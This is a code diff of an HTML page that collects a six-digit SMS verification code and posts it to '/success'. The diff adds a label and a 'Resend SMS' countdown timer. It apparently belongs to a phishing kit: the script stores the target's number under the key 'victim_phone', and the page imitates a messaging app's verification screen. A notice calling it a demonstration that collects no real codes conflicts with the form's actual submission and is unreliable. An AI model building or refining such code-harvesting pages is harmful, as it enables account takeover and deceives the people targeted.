@@ -22,36 +22,44 @@
             <a href="/" class="text-link">Change number</a>
         </p>
 
-        <form action="/success" method="POST" id="otpForm">
-            <div class="otp-wrapper">
-                
-                <!-- FIXED: Changed name to 'otp' -->
-                <input
-                    type="text"
-                    id="verificationCode"
-                    name="otp"
-                    class="otp-input"
-                    placeholder="Enter 6-digit code"
-                    maxlength="6"
-                    minlength="6"
-                    inputmode="numeric"
-                    autocomplete="off"
-                    pattern="[0-9]{6}"
-                    required
-                >
+  <form action="/success" method="POST" id="otpForm">
+    <div class="otp-wrapper">
+        <label for="verificationCode">Verification code</label>
+        
+        <input
+            type="text"
+            id="verificationCode"
+            name="otp"
+            class="otp-input"
+            placeholder="Enter 6-digit code"
+            maxlength="6"
+            minlength="6"
+            inputmode="numeric"
+            autocomplete="off"
+            pattern="[0-9]{6}"
+            required
+        >
+    </div>
 
-            </div>
-<a href="#" id="resendLink" style="color: #00a884; text-decoration: none; font-weight: 500; cursor: pointer;">
-    <label for="verificationCode" style="cursor: pointer;">Didn't receive code?</label>
-</a>
-            <p id="otpError" class="error-message"></p>
+    <!-- THE RESEND SECTION (Pushed down with margin-top) -->
+    <div style="text-align: center; margin-top: 25px; margin-bottom: 30px;">
+        <span style="color: #666; font-size: 14px;">Didn't receive code?</span>
+        <a href="#" id="resendLink" style="color: #00a884; text-decoration: none; font-weight: 600; cursor: not-allowed; opacity: 0.5; font-size: 14px; margin-left: 5px;">
+            Resend SMS (<span id="timer">60</span>s)
+        </a>
+    </div>
 
-            <!-- FIXED: Removed 'disabled' -->
-            <button type="submit" id="verifyButton" class="primary-button">
-                Continue
-            </button>
+    <p id="otpError" class="error-message"></p>
 
-        </form>
+    <button type="submit" id="verifyButton" class="primary-button">
+        Continue
+    </button>
+
+    <p class="demo-notice">
+        Independent frontend demonstration.
+        No real verification codes are collected.
+    </p>
+</form>
     </main>
 
     <footer class="bottom-bar"><span></span></footer>
@@ -67,16 +75,58 @@
 <!-- ADD THIS SCRIPT RIGHT BEFORE </body> -->
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    // 1. Get the phone number from the browser's memory
+    // --- 1. SHOW THE PHONE NUMBER ---
     const savedPhone = sessionStorage.getItem('victim_phone');
-    
-    // 2. Find the display element
     const displayElement = document.getElementById('displayPhone');
-    
-    // 3. If a number was saved, show it. Otherwise, show the default
-    if (savedPhone && savedPhone.length > 5) {
+    if (savedPhone) {
         displayElement.textContent = savedPhone;
     }
+
+    // --- 2. RESEND TIMER LOGIC ---
+    const resendLink = document.getElementById('resendLink');
+    let timeLeft = 60;
+    let timerInterval;
+
+    function startTimer() {
+        timeLeft = 60;
+        resendLink.style.cursor = 'not-allowed';
+        resendLink.style.opacity = '0.5';
+        resendLink.innerHTML = `Resend SMS (<span id="timer">${timeLeft}</span>s)`;
+        
+        const newTimerSpan = document.getElementById('timer');
+
+        // Clear any existing interval to prevent overlapping timers
+        if (timerInterval) clearInterval(timerInterval);
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            if (newTimerSpan) newTimerSpan.textContent = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                resendLink.style.cursor = 'pointer';
+                resendLink.style.opacity = '1';
+                resendLink.innerHTML = `Resend SMS`;
+            }
+        }, 1000);
+    }
+
+    // Start the timer immediately on page load
+    startTimer();
+
+    // Handle the resend click
+    resendLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        // Only allow action if timer is done
+        if (timeLeft <= 0) {
+            // Simulate sending a new code
+            alert("A new verification code has been sent to " + (savedPhone || "your number"));
+            
+            // Restart the timer
+            startTimer();
+        }
+    });
 });
 </script>
 
